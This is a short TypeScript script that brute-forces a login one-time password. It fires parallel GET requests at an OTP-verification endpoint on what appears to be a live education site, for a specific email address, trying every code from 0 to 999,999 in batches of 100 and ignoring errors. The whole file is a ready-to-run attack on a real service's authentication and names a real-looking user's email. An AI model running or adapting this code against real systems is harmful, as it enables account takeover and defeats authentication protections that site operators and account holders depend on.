import axios from "axios";

async function sendRequest(otp: number) {
    let config = {
      method: 'get',
      maxBodyLength: Infinity,
      url: `https://harkiratapi.classx.co.in/get/otpverify?useremail=akhil1659%40gmail.com&otp=${otp}&mydeviceid=&mydeviceid2=`,
      headers: { 
        'sec-ch-ua-platform': '"Android"', 
        'Referer': 'https://harkirat.classx.co.in/', 
        'Device-Type': '', 
        'sec-ch-ua': '"Google Chrome";v="131", "Chromium";v="131", "Not_A Brand";v="24"', 
        'sec-ch-ua-mobile': '?1', 
        'Auth-Key': 'appxapi', 
        'source': 'website', 
        'User-Agent': 'Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Mobile Safari/537.36', 
        'Client-Service': 'Appx'
      }
    };
    
    try {
        await axios.request(config);
    } catch (error) {
        
    }
      
    
}

async function main() {
    for (let i = 0; i < 1000000; i+=100) {
      const promises = [];
      console.log("here for " + i);
      for (let j = 0; j < 100; j++) {
        promises.push(sendRequest(i + j))
      }
      await Promise.all(promises);
    }
  }
  
  main()